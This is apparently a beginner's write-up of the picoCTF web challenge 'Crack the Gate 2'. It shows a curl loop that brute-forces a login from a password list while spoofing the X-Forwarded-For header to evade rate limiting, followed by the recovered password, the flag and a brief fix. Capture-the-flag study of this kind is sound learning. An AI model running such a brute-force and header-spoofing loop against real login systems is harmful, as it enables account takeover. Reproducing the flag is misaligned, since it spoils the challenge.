# Challenge: Crack the Gate 2

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## ğŸ§ª Description

> The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. Weâ€™ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.
Additional details will be available after launching your challenge instance.

---

## ğŸ‘¶ Beginner's Note

I've only been learning cybersecurity for a few months.  
If my logic is incorrect or there is a better way to explain this, please feel free to teach me.  
If you have any learning resources, please recommend them to me.


## ğŸ” Vulnerability Analysis

  I think it must be brute force because it gives me password.txt file but this question gives hints 
  1. rate-limiting from description
  2. You can rotate fake IPs to bypass rate limits.

## â— Limitation
  The limitation is rate - limiting so you can't use the old ip you must change ip.

  ---
## ğŸ› ï¸ Exploitation Strategy
  use bruteforce + change ip when approaching each password.
  So you can use curl / burpsuite but I suggest curl.

```
  i=1; while read -r p; do curl -s -X POST http://amiable-citadel.picoctf.net:57068/login -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.$i" -d "{\"email\":\"ctf-    player@picoctf.org\",\"password\":\"$p\"}" | grep "picoCTF" && echo "Password is: $p" && break; i=$((i+1)); done < passwords.txt
```
and 
You got the flag 
```
  i=1; while read -r p; do curl -s -X POST http://amiable-citadel.picoctf.net:58809/login -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.$i" -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"$p\"}" | grep "picoCTF" && echo "Password is: $p" && break; i=$((i+1)); done < passwords.txt
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{FLAG}"}
Password is: fFWxC3W6
```
---
## ğŸ›¡ï¸ How to Fix

To prevent this vulnerability, safer input handling should be used:
  - Rate Limit by Account to Username
---

## ğŸš© Flag

```
picoCTF{xff_byp4ss_brut3_6cf524b1}
```

---

## ğŸ’¡ What I Learned
- X-Forwarded-For 
- Bruteforce

